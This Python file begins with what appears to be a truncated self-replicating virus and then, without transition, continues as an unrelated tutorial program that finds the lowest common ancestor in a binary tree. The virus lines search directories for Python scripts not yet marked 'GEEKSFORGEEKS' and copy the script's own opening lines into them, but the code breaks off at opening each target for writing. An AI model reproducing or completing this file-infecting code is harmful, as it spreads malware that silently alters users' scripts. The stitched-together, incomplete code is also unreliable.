#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python Program for Lowest Common Ancestor in a Binary Tree
# O(n) solution to find LCS of two given values n1 and n2
 
# A binary tree node
class Node:
    # Constructor to create a new binary node
    def __init__(self, key):
        self.key =  key
        self.left = None
        self.right = None
 
# Finds the path from root node to given root of the tree.
# Stores the path in a list path[], returns true if path
# exists otherwise false
def findPath( root, path, k):
 
    # Baes Case
    if root is None:
        return False
 
    # Store this node is path vector. The node will be
    # removed if not in path from root to k
    path.append(root.key)
 
    # See if the k is same as root's key
    if root.key == k :
        return True
 
    # Check if k is found in left or right sub-tree
    if ((root.left != None and findPath(root.left, path, k)) or
            (root.right!= None and findPath(root.right, path, k))):
        return True
 
    # If not present in subtree rooted with root, remove
    # root from path and return False
      
    path.pop()
    return False
 
# Returns LCA if node n1 , n2 are present in the given
# binary tree otherwise return -1
def findLCA(root, n1, n2):
 
    # To store paths to n1 and n2 fromthe root
    path1 = []
    path2 = []
 
    # Find paths from root to n1 and root to n2.
    # If either n1 or n2 is not present , return -1
    if (not findPath(root, path1, n1) or not findPath(root, path2, n2)):
        return -1
 
    # Compare the paths to get the first different value
    i = 0
    while(i < len(path1) and i < len(path2)):
        if path1[i] != path2[i]:
            break
        i += 1
    return path1[i-1]
 
 
# Driver program to test above function
# Let's create the Binary Tree shown in above diagram
root = Node(1)
root.left = Node(2)
root.right = Node(3)
root.left.left = Node(4)
root.left.right = Node(5)
root.right.left = Node(6)
root.right.right = Node(7)
 
print ("LCA(4, 5) = %d" %(findLCA(root, 4, 5,)))
print ("LCA(4, 6) = %d" %(findLCA(root, 4, 6)))
print ("LCA(3, 4) = %d" %(findLCA(root,3,4)))
print ("LCA(2, 4) = %d" %(findLCA(root,2, 4)))
 
# This code is contributed by Nikhil Kumar Singh(nickzuck_007)
# Time Complexity: O(n) - The tree is traversed twice, and then path arrays are compared.
# Space Complexity: O(n) - Extra space for path1 and path2